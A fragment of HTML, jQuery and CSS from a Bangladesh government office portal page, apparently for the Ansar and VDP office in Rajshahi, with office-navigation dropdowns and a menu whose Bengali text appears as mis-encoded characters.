+                                        à¦‰à¦ªà¦œà§‡à¦²à¦¾ à¦ªà¦°à§à¦¯à¦¾à§Ÿà§‡à¦° à¦¸à¦°à¦•à¦¾à¦°à¦¿ à¦…à¦«à¦¿à¦¸
+                        <!-- Upazila Level Govt. Office -->
+                    </option>
+                <!-- <option value="6">Upazila Level Govt. Office</option> -->
+
+                                    <option value="7">
+                                        à¦†à¦žà§à¦šà¦²à¦¿à¦• à¦…à¦«à¦¿à¦¸à¦¸à¦®à§‚à¦¹
+                        <!-- Union Govt. Office -->
+                    </option>
+                <!-- <option value="7">Union Govt. Office</option> -->
+
+                            </select>
+            
+            <select title="" class="chzn-select doptors d-none" id="first_level"></select>
+            <select title="" class="chzn-select doptors d-none" id="second_level"></select>
+            <select title="" class="chzn-select doptors d-none" id="third_level"></select>
+            <select title="" class="chzn-select doptors d-none" id="forth_level"></select>
+
+            <button class="btn btn-primary btn-sm" id="doptor_navigation_go">Go</button>
+            
+            <!-- <select title="" class="chzn-select doptors d-none mb-2" id="mob_first_level"></select>
+            
+            <select title="" class="chzn-select doptors d-none mb-2" id="mob_second_level"></select>
+            
+            <select title="" class="chzn-select doptors d-none mb-2" id="mob_third_level"></select>
+            
+            <select title="" class="chzn-select doptors d-none" id="mob_forth_level"></select>
+            
+            <button class="btn btn-primary btn-sm" id="mob_doptor_navigation_go">Go</button> -->
+
+        </div>
+    </div>
+</div>
+<!--  -->
+
+<link href="//cdn.jsdelivr.net/npm/select2@4.0.13/dist/css/select2.min.css" rel="stylesheet" />
+<script src="//cdn.jsdelivr.net/npm/select2@4.0.13/dist/js/select2.min.js"></script>
+
+<script>
+
+var getCurrentHost = window.location.host, getHostData = ''
+
+
+    $(document).ready(function() {
+	//$("#first_level, #second_level, #third_level, #forth_level").next().addClass('test');
+	
+
+	
+	var data = {
+
+				'action': 'getHostData',
+				'hostname': getCurrentHost
+
+			};
+
+		$.get("//login.rajshahi.gov.bd/api/v1/theme/ajax", data, function(data, status) {
+		
+			if(data.length>0 || Object.keys(data).length>0){
+				//console.log('Ajax List ',data);
+				// Set all Division
+				getHostData = data ;
+				var elValue = 'alldiv';				
+				$("#doptor").val(elValue);
+				$("#doptor").trigger('change');
+				//var doptorList = getDoptors('doptor', elValue, 'first_level', null);
+			}else{
+				//alert('à¦¤à¦¥à§à¦¯ à¦ªà¦¾à¦“à¦¯à¦¼à¦¾ à¦¯à¦¾à¦¯à¦¼à¦¨à¦¿');
+				//alert('à¦¤à¦¥à§à¦¯ à¦ªà¦¾à¦“à¦¯à¦¼à¦¾ à¦¯à¦¾à¦¯à¦¼à¦¨à¦¿');
+			}
+		});
+        //change language
+        $("#lang-switcher").change(function () {
+            var selectedLang = $(this).val();
+            var defaultLang = "bn";
+            //console.log(selectedLang);
+           // window.location.href = window.location.origin + '/' + selectedLang;
+           var path = window.location.pathname
+            if (path == "/" || path == "/bn") {
+                path = "/en"
+            } else if (path == "/en") {
+                path = "/bn"
+            } else {
+                if (path.indexOf('/bn/') >= 0) {
+                    path = path.replace('/bn/', '/en/')
+                } else {
+                    path = path.replace('/en/', '/bn/')
+                }
+            }
+            var href = window.location.origin + path
+            console.log(href)
+            window.location.href = href
+        });
+        console.log("//login.rajshahi.gov.bd/api/v1/theme/ajax");
+        
+        $("#doptor_navigation_go").click(function() {
+			
+			var getDoptorValue = '';
+
+			if($("#doptor").val() == 'alldiv'){
+				var getDoptorValue = $("#doptor").val();
+			}
+			
+
+            $.each(["forth_level", "third_level", "second_level", "first_level"], function(k, v) {
+                
+				
+
+                var value = $("#" + v).val();
+				
+               
+                 if(value == null || value == '')
+                    return;
+                               
+                 //alert(value);
+                if (value) {
+				
+					var option_level = $("#" + v).attr('id');
+ 
+                    var data = {
+
+                        'action': 'getRedirectDomain',
+                        'id': value,
+						'alldiv': (getDoptorValue ? 1:0),
+						'option_level' : option_level
+                    };
+
+                    $.get("//login.rajshahi.gov.bd/api/v1/theme/ajax", data, function(data, status) {
+						if(data.length>0 || Object.keys(data).length>0){
+						console.log('fqdn check ', data);
+							if(data.is_secure)
+								toRedirect = data.is_secure ? '//' + data.fqdn : 'http://' + data.fqdn;
+							else
+								toRedirect = '//' + (data[0] && data[0].fqdn?data[0].fqdn:data.fqdn);
+							redirectTo(toRedirect);
+						}else{
+							//alert('à¦¤à¦¥à§à¦¯ à¦ªà¦¾à¦“à¦¯à¦¼à¦¾ à¦¯à¦¾à¦¯à¦¼à¦¨à¦¿');
+				            //alert('à¦¤à¦¥à§à¦¯ à¦ªà¦¾à¦“à¦¯à¦¼à¦¾ à¦¯à¦¾à¦¯à¦¼à¦¨à¦¿');
+						}
+                    });
+					
+                    return false;
+                }
+                else
+                {
+                   //var message = "à¦à¦•à¦Ÿà¦¿ à¦ªà§‹à¦°à§à¦Ÿà¦¾à¦² à¦¨à¦¿à¦°à§à¦¬à¦¾à¦šà¦¨ à¦•à¦°à§à¦¨ " ;
+                   var message = "label.select-portal" ;
+                   
+                    alert(message);
+                    
+                    return false;
+                }
+                
+                
+               
+
+            });
+
+
+
+        });
+
+        $('select.doptors').select2({
+            width: '116px'
+        });
+
+        $('#first_level, #second_level, #third_level, #forth_level').select2().next().hide();
+
+        $("#doptor").change(function() {
+			$('#first_level, #second_level, #third_level, #forth_level').select2().next().hide();
+            $("#first_level,#second_level,#third_level,#forth_level").empty().hide();
+
+            var elValue = $(this).val();
+            if(elValue == 'alldiv') $('#doptor_navigation_go').hide();
+            else $('#doptor_navigation_go').show();
+			//alert(elValue);
+            var doptorList = getDoptors('doptor', elValue, 'first_level', null);
+
+        });
+        
+        $('#first_level, #second_level, #third_level, #forth_level').on('select2:select', function (e) {
+            var parentEl = $("#doptor").val();
+            if(parentEl == 'alldiv'){
+                var data = e.params.data;
+                var domain = data.element.attributes[0].nodeValue;
+                window.location.href='//' + domain;
+                //console.log('first_level',data);
+                //console.log('element',data.element.attributes[0].nodeValue);
+            }
+        });
+        
+        $("#first_level").change(function() {
+			
+			$('#second_level, #third_level, #forth_level').select2().next().hide();
+            $("#second_level,#third_level,#forth_level").empty();
+			
+            var elValue = $(this).val();
+            var parentEl = $("#doptor").val();
+            
+            //var getDomain = $('option:selected', this).attr('domain');
+			//alert(getDomain);
+			//if (getDomain != '' && getDomain != getCurrentHost && getDomain != undefined)
+			//console.log(getDomain,getCurrentHost);
+			    //window.location.href='//' + getDomain;
+			
+			if(parentEl == 'alldiv')
+				var doptorList = getDoptors('first_level', elValue, 'second_level', parentEl);
+            else if ($.inArray(parentEl, ["4", "5", "6", "7"]) !== -1)
+                var doptorList = getDoptors('first_level', elValue, 'second_level', parentEl);
+			
+			if(parentEl == 'alldiv') $('#doptor_navigation_go').hide();
+            else $('#doptor_navigation_go').show();
+
+        });
+
+        $("#second_level").change(function() {
+			$('#third_level, #forth_level').select2().next().hide();
+            $("#third_level,#forth_level").empty();
+
+            var elValue = $(this).val();
+            var parentEl = $("#doptor").val();
+            
+            //var getDomain = $('option:selected', this).attr('domain');
+			//alert(getDomain);
+			//if (getDomain != '' && getDomain != getCurrentHost && getDomain != undefined)
+			//console.log('second_level',getDomain,getCurrentHost);
+			    //window.location.href='//' + getDomain;
+			    
+			if(parentEl == 'alldiv')
+				var doptorList = getDoptors('second_level', elValue, 'third_level', parentEl);
+            else if ($.inArray(parentEl, ["5", "6", "7"]) !== -1)
+                var doptorList = getDoptors('second_level', elValue, 'third_level', parentEl);
+			
+			if(parentEl == 'alldiv') $('#doptor_navigation_go').hide();
+            else $('#doptor_navigation_go').show();
+
+        });
+
+        $("#third_level").change(function() {
+			$('#forth_level').select2().next().hide();
+            var elValue = $(this).val();
+            var parentEl = $("#doptor").val();
+            
+            //var getDomain = $('option:selected', this).attr('domain');
+			//alert(getDomain);
+			//if (getDomain != '' && getDomain != getCurrentHost && getDomain != undefined)
+			//console.log('third_level',getDomain,getCurrentHost);
+			    //window.location.href='//' + getDomain;
+            
+			if(parentEl == 'alldiv')
+				var doptorList = getDoptors('third_level', elValue, 'forth_level', parentEl);
+            else if ($.inArray(parentEl, ["6", "7"]) !== -1)
+                var doptorList = getDoptors('third_level', elValue, 'forth_level', parentEl);
+            //$(this).nextAll().hide();
+			if(parentEl == 'alldiv') $('#doptor_navigation_go').hide();
+            else $('#doptor_navigation_go').show();
+
+        });
+
+
+
+        function redirectTo(url) {
+
+            window.location.href = url;
+        }
+
+        function renderList(targetEl, list, elValue='', parentEl='') {
+		var currentLang = "bn";
+		var getSelectedId = ''
+		var selectDomain = ''
+		var getValueName = ''
+		var getLayerId = 'alldiv'
+		var getSiteName = ''
+			//$("#"+targetEl).show();
+			
+			
+            $select = $("#" + targetEl);
+						
+			console.log('List Data ->  ', list);
+			
+
+            if (list.length !== 0) {
+											
+				$select.select2().next().show();
+				$select.select2({
+					width: '116px'
+				});
+                $select = $("#" + targetEl).empty();
+                $select.append('<option value="">----</option>');
+				console.log('getHostData ', getHostData)
+				
+                $.each(list, function(key, value) {
+                    console.log('Render Log ',value);
+					console.log('ElVal Log ',elValue);
+					
+					getSiteName = value.name;
+					
+					if(elValue == 'alldiv' || parentEl =='alldiv'){
+						//$select.append('<option domain="' + value.domain + '" value=' + value.id + '>' + (currentLang=='bn'? value.name_bng:value.name_eng) + '</option>');
+						$select.append('<option domain="' + value.domain + '" value=' + value.id + '>' + getSiteName + '</option>');
+						if(value.layer_id && elValue == 'alldiv')
+							getLayerId = value.layer_id;							
+					}else{
+						$select.append('<option domain="' + value.domain + '" value=' + value.id + '>' + getSiteName + '</option>');
+					}
+					
+					if(getHostData['parent2_data'] && value.id == getHostData['parent2_data'].parent_id ){
+						getSelectedId = getHostData['parent2_data'].parent_id					
+					}
+					
+					else if(getHostData['parent2_data'] && value.id == getHostData['parent2_data'].id ){
+						getSelectedId = getHostData['parent2_data'].id					
+					}
+					
+					else if(getHostData['parent_data'] && value.id == getHostData['parent_data'].parent_id ){
+						getSelectedId = getHostData['parent_data'].parent_id					
+					}
+					
+					else if(getHostData['parent_data'] && value.id == getHostData['parent_data'].id ){
+						getSelectedId = getHostData['parent_data'].id					
+					}					
+					
+					else if(value.id == getHostData[0].parent_id ){
+						getSelectedId = getHostData[0].parent_id					
+					}
+																				
+				
+					else if(value.id == getHostData[0].id){				
+						getSelectedId = getHostData[0].id						
+					}
+					
+					else if(getHostData['parent3_data'] && value.domain == getHostData['parent3_data'].subdomain){				
+						getSelectedId = value.id						
+					}
+					
+					else if(getHostData['parent2_data'] && value.domain == getHostData['parent2_data'].subdomain){				
+						getSelectedId = value.id						
+					}
+					
+					else if(getHostData['parent_data'] && value.domain == getHostData['parent_data'].subdomain){				
+						getSelectedId = value.id						
+					}
+					
+					else if(value.domain == getHostData[0].subdomain){				
+						getSelectedId = value.id						
+					}
+                });
+                
+    
+
+                $select.removeClass('d-none');
+            } else {
+                $select.empty();
+            }
+			console.log('targetEl ', targetEl)
+			if(elValue == 'alldiv' && getLayerId!= 'alldiv'){
+				$("#doptor").val(getLayerId);
+				$("#doptor").trigger("change")
+				console.log('getLayerId  ', getLayerId)				
+			}
+			$("#" + targetEl).val(getSelectedId);
+			if(getSelectedId!=''){
+				$select.prepend('<option domain="' + $("#" + targetEl).find(":selected").attr('domain') + '" value=' + getSelectedId + '>' + $("#" + targetEl).find(":selected").text() + '</option>');
+			}
+			
+			$("#" + targetEl).trigger("change")
+
+			
+        }
+
+
+        function getDoptors(el, elValue, targetEl, parentEl) {
+
+
+            var data = {
+
+                'action': 'getdoptors',
+                'el': el,
+                'elValue': elValue,
+                'target': targetEl,
+                'layer': parentEl,
+				'lang' : 'bn',
+				'currentHostId' : getHostData[0].id
+
+            };
+			console.log('=Lang==> ',data);
+
+            $.get("//login.rajshahi.gov.bd/api/v1/theme/ajax", data, function(data, status) {
+                renderList(targetEl, data, elValue, parentEl);			
+				
+				
+            });
+
+
+        }
+
+    });
+
+
+    var btn = document.querySelector('#lang-btn');
+    if (btn) {
+        btn.addEventListener('click', function() {
+            var path = window.location.pathname
+            if (path == "/" || path == "/bn") {
+                path = "/en"
+            } else if (path == "/en") {
+                path = "/bn"
+            } else {
+                if (path.indexOf('/bn/') >= 0) {
+                    path = path.replace('/bn/', '/en/')
+                } else {
+                    path = path.replace('/en/', '/bn/')
+                }
+            }
+            var href = window.location.origin + path
+            console.log(href)
+            window.location.href = href
+        })
+    }
+</script>
+
+<style>
+    .top-menu {
+        background-color: #683091;
+        box-shadow: 0 1px 5px #999999;
+        border-bottom: 4px solid #8bc643;
+        color: #ffffff;
+        padding: 5px 0;
+    }
+
+    .navbar {
+        height: 40px;
+    }
+
+
+    .bd-gov-site {
+        display: flex;
+        align-items: center;
+    }
+
+    .top-menu .bd-gov-site a {
+        color: white;
+        font-size: 1.1em;
+        padding-left: 10px; line-height:31px;
+    }
+
+    .middle-form {
+        display: flex;
+        align-items: center;
+        flex-wrap: wrap;
+    }
+
+    .form-item {
+        padding: 0 3px;
+    }
+
+    .search-form input {
+        font-size: 14px;
+        border-radius: 2px;
+        border: none;
+    }
+
+    .top-menu select,
+    .top-menu input {
+        border: 1px solid #ccc;
+        outline: none;
+        border-radius: 2px;
+        font-size: 13px;
+        color: #000;
+    }
+
+    .top-menu .search-btn {
+        border: 1px solid #34740e;
+        border-radius: 3px;
+        font-size: 12px;
+        background-color: #4ba614;
+        background-image: linear-gradient(to bottom, #4ba614, #008c00);
+        padding: 2px 10px;
+    }
+    
+    #lang-switcher {
+        padding: 0 9px; 
+        height:30px; 
+        width:90px; 
+        margin-left: -45px;
+    }
+    
+    #doptor_navigation_go {
+        display: none;
+    }
+    
+    .another_portal{ background:#fafafa;}
+    #mob_navigation {
+        /* background-image: url(http://cdn.sylhet.gov.bd/media/central/themes/default/img/portal_navigation.png); */
+        background-repeat: no-repeat !important; padding:8px 5px 5px 5px; display:block;
+    }
+
+    .another_portal a:visited,.another_portal a:focus{ text-decoration:none !important}
+    .portal_cont{ padding:5px; display:none;}
+    #lang-btn{ margin-right:10px}
+    
+    @media (max-width: 767.98px) {
+        .top-menu .bd-gov-site a {
+            font-size: 0.9em;
+        }
+        .middle-form {
+            display: flex !important;
+        }
+        .select2-container{
+            margin: 3px 0px !important;    
+        }
+        #lang-switcher {
+            margin-left: 3px!important;
+            margin-top: 5px!important;
+        }
+    }
+    @media print{
+    #top {
+    display: none !important;
+}
+}
+</style>
+<script>
+    $(document).ready(function(){
+        
+        $("#mob_navigation").click(function(){
+            $(".portal_cont").toggle();
+        });
+    });
+    
+    
+</script>        
+                
+            
+                    
+            <div id="banner-slider" style=" position:relative;">
+
+    <!--  -->
+    
+    <div id="carouselExampleIndicators" class="carousel slide carousel-fade" data-ride="carousel">
+      <div class="carousel-inner">
+             </div>
+    </div>
+<!--/carousel-->
+
+</div>
+
+<div class="plain-header">
+    <div id="logo">
+        <a title="" href="/">
+            <img alt="Bangladesh Govertment logo" src="//file-rajshahi.portal.gov.bd/media/central/themes/theme-default/img/logo.png" style=" width:50px; ">
+        </a>
+    </div>
+    <div class="" id="">
+        <span id="palin-header-text">
+            <a title="à¦†à¦¨à¦¸à¦¾à¦° à¦“ à¦­à¦¿à¦¡à¦¿à¦ªà¦¿" href="/"> à¦†à¦¨à¦¸à¦¾à¦° à¦“ à¦­à¦¿à¦¡à¦¿à¦ªà¦¿</a>
+        </span>
+        <span id=""></span>
+    </div>
+</div>
+
+<div class="header-site-info" id="header-site-info">
+    <div>
+        <div id="logo">
+            <a title="
+                
+            " href="/">
+                <img alt="Bangladesh Govertment logo" src="//file-rajshahi.portal.gov.bd/media/central/themes/theme-default/img/logo.png">
+            </a>
+        </div>
+        <div class="clearfix" id="site-name-wrapper">
+            <span id="site-name">
+                <a title="à¦†à¦¨à¦¸à¦¾à¦° à¦“ à¦­à¦¿à¦¡à¦¿à¦ªà¦¿ " href="/"> à¦†à¦¨à¦¸à¦¾à¦° à¦“ à¦­à¦¿à¦¡à¦¿à¦ªà¦¿ </a>
+            </span>
+            <span id="slogan"></span>
+        </div>
+    </div>
+</div>
+<div style="clear: both"></div>
+
+<style>
+    #header-site-info {
+        left: 20px;
+        margin-bottom: 0;
+        padding: 10px;
+        position: absolute;
+        top: 80px;
+        z-index: 100;
+        width: 90%;
+    }
+
+    .plain-header {
+        display: none;
+    }
+
+    #palin-header-text {}
+
+    #logo {
+        display: block;
+        margin: 0 0 10px 15px;
+        float: left;
+        width: 12%;
+    }
+
+    #site-name-wrapper {
+        position: relative;
+        float: left;
+        padding: 10px 0;
+        line-height: 2;
+        margin-left: -15px;
+    }
+
+    #site-name {
+        font-size: 2vw;
+        font-weight: bold;
+        text-shadow: -1px -1px 10px #333, 1px -1px 10px #333, -1px 1px 10px #333, 1px 1px 10px #333;
+    }
+
+    #site-name a,
+    #slogan {
+        color: #ffffff;
+    }
+
+    #site-name,
+    #slogan {
+        display: block;
+    }
+
+
+    #banner-slider {display: none;}
+
+    #header-site-info {}
+
+    @media screen and (max-width: 978px) {
+
+        #banner-slider {
+
+            display: none;
+        }
+
+
+        #header-site-info {
+            position: static;
+            display: none;
+        }
+
+
+        .plain-header {
+            display: block;
+            margin-top: 13px;
+        }
+    }
+
+    #palin-header-text {
+        position: relative;
+        top: 13px;
+        left: 19px;
+    }
+    }
+
+    @media screen and (max-width: 1199px) {
+
+
+
+        #site-name-wrapper {
+            margin-top: 5px;
+            margin-left: 5px;
+        }
+
+    }
+
+    @media screen and (max-width: 767px) {
+
+        #header-site-info {
+
+            margin-left: 5px;
+
+        }
+
+
+
+    }
+
+    @media screen and (max-width: 414px) {
+
+        #palin-header-text {
+
+            top: 11px;
+            left: 30px;
+        }
+
+    }
+</style>        
+                
+            
+                    
+            <div class="row" style="margin-bottom: 15px;">
+    <div class="col-md-12">
+        <div class="menu d-none d-md-block cmn-mrg-btm">
+            <ul class="menu-container meganizr mzr-slide mzr-responsive">
+                <li class="col0 home"><a href=/bn><i class="fas fa-home"></i></a></li>
+                                                
+                <!-- Menu Color Admin Custom Start -->
+                    <!--  -->
+                    <!--  -->
+                                                            
+                                                                    <!-- 1  -->
+                                        
+                                                                    <!-- 1  -->
+                                    <!-- Menu Color Admin Custom End -->
+                
+                <li class="mzr-drop menu-link  c1  focusin-drop focusClassDrop" style="background:">
+                    <a href="#" title="à¦†à¦®à¦¾à¦¦à§‡à¦° à¦¸à¦®à§à¦ªà¦°à§à¦•à§‡" style="color: ">à¦†à¦®à¦¾à¦¦à§‡à¦° à¦¸à¦®à§à¦ªà¦°à§à¦•à§‡</a>
+                    <div class="sub-menu mzr-content " >
+                        <div class="five-col">
+                                                                                                
+
+                        
+                        <!-- Sub-Menu Color Admin Custom Start -->
+                            <!--  -->
+                            <!--  -->
+                                                                                    
+                                                                                            <!-- 1  -->
+                                                        
+                                                                                            <!-- 1  -->
+                                                    <!-- Sub-Menu Color Admin Custom End -->
+						
+                        <div class="one-col">
+                                                                                            <a title="à¦œà¦¨à¦¬à¦²" href="/bn/#">
+                                    <h6 style="background:; color: ;  font-size: 16px!important;">à¦œà¦¨à¦¬à¦²</h6>
+                                </a>
+                                                        
+                            <ul class="mzr-links">
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦•à¦°à§à¦®à¦•à¦°à§à¦¤à¦¾" href="/bn/site/officer_list/à¦®à§‹à¦ƒ-à¦°à¦¾à¦•à¦¿à¦¬à§à¦²-à¦¹à¦¾à¦¸à¦¾à¦¨"
+                                    style="color: ">à¦•à¦°à§à¦®à¦•à¦°à§à¦¤à¦¾</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦…à¦«à¦¿à¦¸ à¦ªà§à¦°à¦§à¦¾à¦¨" href="/bn/site/officer_list/à¦®à§‹à¦ƒ-à¦°à¦¾à¦•à¦¿à¦¬à§à¦²-à¦¹à¦¾à¦¸à¦¾à¦¨"
+                                    style="color: ">à¦…à¦«à¦¿à¦¸ à¦ªà§à¦°à¦§à¦¾à¦¨</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦ªà§à¦°à¦¾à¦•à§à¦¤à¦¨ à¦…à¦«à¦¿à¦¸ à¦ªà§à¦°à¦¾à¦§à¦¨à¦—à¦£" href="/bn/site/officer_list/XcrQ-à¦®à§‹à¦¹à¦¾à¦®à§à¦®à¦¾à¦¦-à¦¹à¦¾à¦¸à§‡à¦®-à¦†à¦²à§€"
+                                    style="color: ">à¦ªà§à¦°à¦¾à¦•à§à¦¤à¦¨ à¦…à¦«à¦¿à¦¸ à¦ªà§à¦°à¦¾à¦§à¦¨à¦—à¦£</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦¤à¦¥à§à¦¯ à¦ªà§à¦°à¦¦à¦¾à¦¨à¦•à¦¾à¦°à§€ à¦•à¦°à§à¦®à¦•à¦°à§à¦¤à¦¾" href="/bn/site/info_officer/à¦®à§‹à¦ƒ-à¦°à¦¾à¦•à¦¿à¦¬à§à¦²-à¦¹à¦¾à¦¸à¦¾à¦¨"
+                                    style="color: ">à¦¤à¦¥à§à¦¯ à¦ªà§à¦°à¦¦à¦¾à¦¨à¦•à¦¾à¦°à§€ à¦•à¦°à§à¦®à¦•à¦°à§à¦¤à¦¾</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦¸à¦¾à¦‚à¦—à¦ à¦¨à¦¿à¦• à¦•à¦¾à¦ à¦¾à¦®à§‹" href="/bn/site/page/04F2-à¦¸à¦¾à¦‚à¦—à¦ à¦¨à¦¿à¦•-à¦•à¦¾à¦ à¦¾à¦®à§‹"
+                                    style="color: ">à¦¸à¦¾à¦‚à¦—à¦ à¦¨à¦¿à¦• à¦•à¦¾à¦ à¦¾à¦®à§‹</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦•à¦°à§à¦®à¦šà¦¾à¦°à§€à¦¬à§ƒà¦¨à§à¦¦" href="/bn/site/staff_list/à¦®à§‹à¦ƒ-à¦†à¦²-à¦†à¦®à¦¿à¦¨"
+                                    style="color: ">à¦•à¦°à§à¦®à¦šà¦¾à¦°à§€à¦¬à§ƒà¦¨à§à¦¦</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                                            </ul>
+                        </div>
+                                                                                                
+
+                        
+                        <!-- Sub-Menu Color Admin Custom Start -->
+                            <!--  -->
+                            <!--  -->
+                                                                                    
+                                                                                            <!-- 1  -->
+                                                        
+                                                                                            <!-- 1  -->
+                                                    <!-- Sub-Menu Color Admin Custom End -->
+						
+                        <div class="one-col">
+                                                                                            <a title="à¦…à¦«à¦¿à¦¸ à¦¸à¦®à§à¦ªà¦°à§à¦•à¦¿à¦¤" href="/bn/#">
+                                    <h6 style="background:; color: ;  font-size: 16px!important;">à¦…à¦«à¦¿à¦¸ à¦¸à¦®à§à¦ªà¦°à§à¦•à¦¿à¦¤</h6>
+                                </a>
+                                                        
+                            <ul class="mzr-links">
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦à¦• à¦¨à¦œà¦°à§‡" href="/bn/site/page/à¦à¦•-à¦¨à¦œà¦°à§‡"
+                                    style="color: ">à¦à¦• à¦¨à¦œà¦°à§‡</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦†à¦®à¦¾à¦¦à§‡à¦° à¦…à¦°à§à¦œà¦¨à¦¸à¦®à§‚à¦¹" href="/bn/site/page/à¦†à¦®à¦¾à¦¦à§‡à¦°-à¦…à¦°à§à¦œà¦¨à¦¸à¦®à§‚à¦¹"
+                                    style="color: ">à¦†à¦®à¦¾à¦¦à§‡à¦° à¦…à¦°à§à¦œà¦¨à¦¸à¦®à§‚à¦¹</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦¸à¦¾à¦®à§à¦ªà§à¦°à¦¤à¦¿à¦• à¦•à¦°à§à¦®à¦•à¦¾à¦¨à§à¦¡" href="/bn/site/page/à¦¸à¦¾à¦®à§à¦ªà§à¦°à¦¤à¦¿à¦•-à¦•à¦°à§à¦®à¦•à¦¾à¦¨à§à¦¡"
+                                    style="color: ">à¦¸à¦¾à¦®à§à¦ªà§à¦°à¦¤à¦¿à¦• à¦•à¦°à§à¦®à¦•à¦¾à¦¨à§à¦¡</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦­à¦¬à¦¿à¦·à§à¦¯à§Ž à¦ªà¦°à¦¿à¦•à¦²à§à¦ªà¦¨à¦¾" href="/bn/#"
+                                    style="color: ">à¦­à¦¬à¦¿à¦·à§à¦¯à§Ž à¦ªà¦°à¦¿à¦•à¦²à§à¦ªà¦¨à¦¾</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦˜à¦Ÿà¦¨à¦¾à¦ªà§à¦žà§à¦œ" href="/bn/#"
+                                    style="color: ">à¦˜à¦Ÿà¦¨à¦¾à¦ªà§à¦žà§à¦œ</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                                            </ul>
+                        </div>
+                                                </div>
+                    </div>
+                </li>
+                                                
+                <!-- Menu Color Admin Custom Start -->
+                    <!--  -->
+                    <!--  -->
+                                                            
+                                                                    <!-- 1  -->
+                                        
+                                                                    <!-- 1  -->
+                                    <!-- Menu Color Admin Custom End -->
+                
+                <li class="mzr-drop menu-link  c2  focusin-drop focusClassDrop" style="background:">
+                    <a href="#" title="à¦†à¦®à¦¾à¦¦à§‡à¦° à¦¸à§‡à¦¬à¦¾" style="color: ">à¦†à¦®à¦¾à¦¦à§‡à¦° à¦¸à§‡à¦¬à¦¾</a>
